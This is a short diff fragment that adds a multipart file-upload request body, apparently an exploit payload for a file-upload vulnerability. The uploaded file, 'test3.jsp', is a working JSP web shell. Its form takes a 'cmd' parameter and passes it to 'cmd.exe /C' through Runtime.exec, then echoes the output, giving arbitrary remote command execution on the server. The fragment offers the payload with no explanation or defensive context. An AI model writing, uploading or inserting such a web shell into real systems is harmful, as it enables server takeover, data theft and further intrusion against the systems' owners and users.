@@ -18,3 +18,40 @@ Content-Type: application/octet-stream
 
 
 ------WebKitFormBoundarybFBIeS70tRNHl16T--
+------WebKitFormBoundarybFBIeS70tRNHl16T
+Content-Disposition: form-data; name="file"; filename="test3.jsp"
+Content-Type: application/octet-stream
+
+<FORM METHOD=GET ACTION='cmdjsp.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) {
+            output += s;
+         }
+      }
+      catch(IOException e) {
+         e.printStackTrace();
+      }
+   }
+%>
+
+<pre>
+<%=output %>
+</pre>
+
+
+
+
+------WebKitFormBoundarybFBIeS70tRNHl16T--
